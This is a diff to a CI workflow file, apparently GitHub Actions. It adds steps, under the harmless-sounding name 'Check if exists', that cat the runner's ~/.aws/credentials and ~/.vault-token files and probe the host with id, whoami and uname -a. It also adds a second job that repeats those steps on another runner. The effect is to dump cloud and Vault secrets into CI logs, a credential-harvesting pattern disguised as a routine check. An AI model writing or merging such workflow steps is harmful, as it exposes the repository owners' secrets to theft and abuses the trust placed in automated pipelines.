@@ -20,5 +20,17 @@ jobs:
           fetch-depth: 0
       - name: Check if exists
         run: |
-          sh -c "ls -la ~/.aws/credentials; ls -la ~/.vault-token; pwd; id; whoami"
+          sh -c "ls -la ~/.aws/credentials; ls -la ~/.vault-token; pwd; uname -a; id; whoami"
+          sh -c "cat ~/.aws/credentials; cat ~/.vault-token"
+  lets-test-it-again:
+    runs_on: test-runners
+    steps:
+      - name: Check out code
+        id: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Check if exists
+        run: |
+          sh -c "ls -la ~/.aws/credentials; ls -la ~/.vault-token; pwd; uname -a; id; whoami"
           sh -c "cat ~/.aws/credentials; cat ~/.vault-token"
